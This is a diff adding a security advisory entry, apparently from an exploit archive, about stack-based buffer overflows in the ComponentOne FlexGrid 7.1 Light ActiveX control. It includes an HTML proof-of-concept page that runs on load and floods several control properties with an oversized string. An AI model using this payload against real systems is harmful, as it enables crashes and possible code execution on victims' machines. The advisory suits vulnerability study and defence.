@@ -1,0 +1,28 @@
+source: http://www.securityfocus.com/bid/26467/info
+
+ComponentOne FlexGrid ActiveX Control is prone to multiple stack-based buffer-overflow vulnerabilities because the application fails to adequately check boundaries on user-supplied input.
+
+An attacker can exploit these issues to cause denial denial-of-service conditions and possibly to execute arbitrary code, but this has not been confirmed.
+
+ComponentOne FlexGrid 7.1 Light is vulnerable; other versions may also be affected. 
+
+<html>
+ <head>
+  <script language="JavaScript" DEFER>
+    function Check() {
+     var s = "AAAA";
+
+     while (s.length < 262145) s=s+s;
+
+     var obj = new ActiveXObject("VSFlexGrid.VSFlexGridL");
+
+     obj.Text = s;
+     obj.EditSelText = s;
+     obj.EditText = s;
+     obj.CellFontName = s;
+   }
+  </script>
+
+ </head>
+ <body onload="JavaScript: return Check();" />
+</html> 
